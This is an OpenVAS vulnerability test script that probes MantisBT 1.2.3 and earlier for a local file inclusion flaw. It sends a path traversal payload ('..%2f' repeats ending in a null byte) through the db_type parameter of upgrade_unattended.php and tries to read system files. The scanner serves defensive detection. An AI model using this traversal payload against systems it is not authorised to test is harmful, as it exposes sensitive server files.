###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mantis_lfi.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# MantisBT <=1.2.3 (db_type) Local File Inclusion Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Mantis is prone to a local file-include vulnerability because it fails
to properly sanitize user supplied input. Input passed through the
'db_type' parameter (GET & POST) to upgrade_unattended.php script is
not properly verified before being used to include files.

Mantis is also prone to a cross-site scripting
attack.";


if (description)
{
 script_id(100947);
 script_version("$Revision: 7577 $");
 script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2010-12-15 13:36:34 +0100 (Wed, 15 Dec 2010)");
 script_bugtraq_id(45399);
 script_tag(name:"cvss_base", value:"5.1");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_name("MantisBT <=1.2.3 (db_type) Local File Inclusion Vulnerability");

 script_xref(name : "URL" , value : "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4984.php");
 script_xref(name : "URL" , value : "http://www.mantisbt.org/bugs/view.php?id=12607");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("mantis_detect.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);
if(!get_port_state(port)){
    exit(0);
}

if(!can_host_php(port:port))exit(0);
if(!dir = get_dir_from_kb(port:port,app:"mantis"))exit(0);
files = traversal_files();

foreach file (keys(files)) {
   
  url = string(dir,"/admin/upgrade_unattended.php?db_type=",crap(data:"..%2f",length:5*15),files[file],"%00"); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);


   
